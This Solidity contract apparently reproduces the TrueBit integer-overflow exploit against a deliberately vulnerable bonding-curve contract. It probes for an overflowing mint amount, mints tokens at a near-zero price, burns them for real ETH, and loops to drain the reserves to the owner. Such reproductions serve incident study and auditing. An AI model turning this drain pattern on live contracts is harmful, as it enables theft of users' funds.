// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBondingCurve.sol";

/**
 * @title AttackSimulation
 * @notice Demonstrates the TrueBit-style integer overflow attack
 * @dev The attacker's actual contract had a function literally named "Attack"
 */
contract AttackSimulation {
    VulnerableBondingCurve public target;
    address public owner;
    
    // Attack configuration
    // In the real attack, these were calibrated to maximize extraction
    uint256 public constant OVERFLOW_AMOUNT = type(uint256).max - 1e30;
    
    event AttackExecuted(uint256 tokensReceived, uint256 ethPaid, uint256 ethExtracted);
    
    constructor(address _target) {
        target = VulnerableBondingCurve(payable(_target));
        owner = msg.sender;
    }
    
    /**
     * @notice Execute the overflow attack
     * @dev Mirrors the actual attack pattern:
     * 1. Calculate overflow amount that returns near-zero price
     * 2. Mint massive tokens for almost nothing
     * 3. Burn tokens for real ETH at buyback rate
     * 4. Repeat until reserves depleted
     */
    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        
        uint256 startBalance = address(this).balance;
        
        // Step 1: Probe for overflow amount
        // Find an amount where getPurchasePrice returns near-zero
        uint256 attackAmount = findOverflowAmount();
        
        // Step 2: Get the (broken) price
        uint256 cost = target.getPurchasePrice(attackAmount);
        
        // Step 3: Mint tokens - paying almost nothing for billions
        target.mint{value: cost + 1}(attackAmount);
        
        uint256 tokensReceived = target.balanceOf(address(this));
        
        // Step 4: Burn tokens - receive real ETH at buyback rate
        // In TrueBit, this was 12.5% of highest mint price
        target.burn(tokensReceived);
        
        uint256 endBalance = address(this).balance;
        uint256 profit = endBalance > startBalance ? endBalance - startBalance : 0;
        
        emit AttackExecuted(tokensReceived, cost + 1, profit);
        
        // Return profits to attacker
        if (profit > 0) {
            payable(owner).transfer(address(this).balance);
        }
    }
    
    /**
     * @notice Find amount that causes overflow to near-zero price
     * @dev Binary search for the sweet spot
     */
    function findOverflowAmount() public view returns (uint256) {
        // Start with amounts near uint256 max
        // Look for where price calculation wraps
        uint256 testAmount = type(uint256).max / 2;
        
        for (uint256 i = 0; i < 256; i++) {
            uint256 price = target.getPurchasePrice(testAmount);
            
            // If price is suspiciously low relative to amount, found overflow
            if (price < testAmount / 1e30) {
                return testAmount;
            }
            
            // Adjust search
            testAmount = testAmount + (type(uint256).max - testAmount) / 2;
        }
        
        // Fallback to known working value
        return OVERFLOW_AMOUNT;
    }
    
    /**
     * @notice Multi-iteration attack matching real exploit
     * @dev TrueBit attacker did 5 mint-burn cycles in one transaction
     */
    function attackLoop(uint256 iterations) external payable {
        require(msg.sender == owner, "Only owner");
        
        for (uint256 i = 0; i < iterations; i++) {
            uint256 reserveBefore = target.reserveBalance();
            if (reserveBefore == 0) break;
            
            uint256 attackAmount = findOverflowAmount();
            uint256 cost = target.getPurchasePrice(attackAmount);
            
            if (cost > address(this).balance) break;
            
            target.mint{value: cost + 1}(attackAmount);
            uint256 tokens = target.balanceOf(address(this));
            
            if (tokens > 0) {
                target.burn(tokens);
            }
        }
        
        // Send all profits to owner
        if (address(this).balance > 0) {
            payable(owner).transfer(address(this).balance);
        }
    }
    
    receive() external payable {}
}
